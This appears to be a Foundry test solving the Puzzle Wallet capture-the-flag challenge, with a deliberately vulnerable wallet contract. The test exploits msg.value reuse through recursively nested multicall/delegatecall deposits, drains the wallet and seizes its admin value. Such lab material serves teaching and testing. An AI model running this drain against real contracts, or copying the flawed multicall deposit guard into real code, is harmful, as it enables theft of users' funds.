//SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract PuzzleWalletTest is Test {
    PuzzleWallet wallet;

    address caller = address(100);
    function setUp() public {
        wallet = new PuzzleWallet();
        wallet.init(7e18);
        wallet.addToWhitelist(caller);
        wallet.addToWhitelist(address(wallet));
        vm.deal(address(wallet), 0.001 ether);
    }

    function _makeBatch(
        uint256 layers,
        uint256 maxLayers
    ) internal returns (bytes[] memory) {
        if (layers >= maxLayers - 1) {
            bytes[] memory latestBatch = new bytes[](1);
            latestBatch[0] = abi.encode(wallet.deposit.selector);
            return latestBatch;
        }

        bytes[] memory batch = new bytes[](2);

        batch[0] = abi.encode(wallet.deposit.selector);
        batch[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            _makeBatch(layers + 1, maxLayers)
        );

        return batch;
    }

    function testValueReusage() public {
        vm.deal(caller, 1e18);

        uint256 walletBalance = address(wallet).balance;
        uint256 value = 0.0002 ether;
        uint256 times = (walletBalance + value) / value + 1;
        bytes[] memory batch = _makeBatch(0, times);

        vm.prank(caller);
        wallet.multicall{value: value}(batch);
        //drain
        vm.prank(caller);
        wallet.execute{value: 1}(
            address(caller),
            address(wallet).balance + 1,
            ""
        );
        vm.prank(caller);
        wallet.setMaxBalance(uint160(address(this)));
        console.log("Caller Bal: ", address(wallet).balance);
        console.log("Admin: ", wallet.maxBalance());
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
